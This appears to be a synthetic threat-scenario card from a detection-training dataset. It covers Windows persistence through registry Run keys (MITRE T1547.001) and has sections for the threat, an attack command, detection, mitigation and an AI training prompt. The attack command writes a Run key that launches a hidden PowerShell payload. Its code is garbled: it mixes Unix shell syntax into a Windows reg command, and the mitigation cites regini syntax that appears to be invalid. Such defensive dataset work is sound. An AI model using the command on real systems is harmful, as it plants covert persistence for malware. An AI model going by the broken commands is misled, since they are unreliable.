---
type: campaign
scenario_id: 6
tactic: Persistence
technique: "T1547.001: Registry Run Keys"
technique_id: T1547.001
tags: [campaign, lotl, persistence]
---

# Adding malicious run key for persistence using reg add.

## Threat Description
Adding malicious run key for persistence using reg add.

## Attack Command
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d "powershell -w hidden -c 'I$(echo payload | base64 -w0)'"
```

## Detection Logic
Monitor registry changes: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`; Event ID 4657.

## Mitigation
Restrict registry writes: `regini -h deny HKCU\Software\Microsoft\Windows\CurrentVersion\Run`; Enable registry auditing.

## AI Training Prompt
Train AI to detect unauthorized run key additions and suggest registry protections.

## References
- MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
